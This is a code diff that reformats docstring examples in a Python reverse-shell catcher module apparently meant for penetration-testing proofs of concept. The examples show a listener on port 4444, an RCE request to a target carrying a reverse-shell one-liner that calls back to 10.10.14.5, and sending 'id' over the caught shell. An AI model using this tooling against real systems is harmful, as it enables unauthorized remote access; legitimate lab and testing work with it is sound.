@@ -23,18 +23,20 @@ class ShellCatcher:
     Simple reverse shell catcher for POCs.
 
     Examples:
-        ... from utils.shell_catcher import ShellCatcher
+        .. code-block:: python
 
-        >>> # Start listener in background
-        >>> catcher = ShellCatcher(4444)
-        >>> catcher.start()
-
-        >>> # Trigger your exploit here
-        >>> exploit_target()
-
-        >>> # Wait for shell and interact
-        >>> if catcher.wait_for_shell(timeout=10):
-        ...     catcher.interact()
+            from utils.shell_catcher import ShellCatcher
+            
+            # Start listener in background
+            catcher = ShellCatcher(4444)
+            catcher.start()
+            
+            # Trigger your exploit here
+            exploit_target()
+            
+            # Wait for shell and interact
+            if catcher.wait_for_shell(timeout=10):
+                catcher.interact()
     """
 
     def __init__(self, port, host="0.0.0.0"):
@@ -367,10 +369,12 @@ def quick_catch(port=4444, trigger_func=None, trigger_delay=1):
     Quick helper to catch a shell with optional trigger function.
 
     Examples:
-        ... def trigger():
-        ...     requests.get(f"http://target/rce?cmd={python_oneliner('10.10.14.5', 4444)}")
+        .. code-block:: python
 
-        >>> quick_catch(4444, trigger_func=trigger)
+            def trigger():
+                requests.get(f"http://target/rce?cmd={python_oneliner('10.10.14.5', 4444)}")
+            
+            quick_catch(4444, trigger_func=trigger)
     """
     catcher = ShellCatcher(port)
     catcher.start()
@@ -394,14 +398,16 @@ def auto_shell(port=4444, wait_timeout=30):
     Context manager for shell catching with auto-wait.
 
     Examples:
-        ... with auto_shell(4444) as catcher:
-        >>>     # Trigger exploit
-        ...     exploit_target()
+        .. code-block:: python
 
-        >>>     # Automatically waits for shell
-        ...     if catcher.shell_caught:
-        ...         catcher.send_command("id")
-        ...         catcher.interact()
+            with auto_shell(4444) as catcher:
+                # Trigger exploit
+                exploit_target()
+            
+                # Automatically waits for shell
+                if catcher.shell_caught:
+                    catcher.send_command("id")
+                    catcher.interact()
     """
 
     class ShellContext:
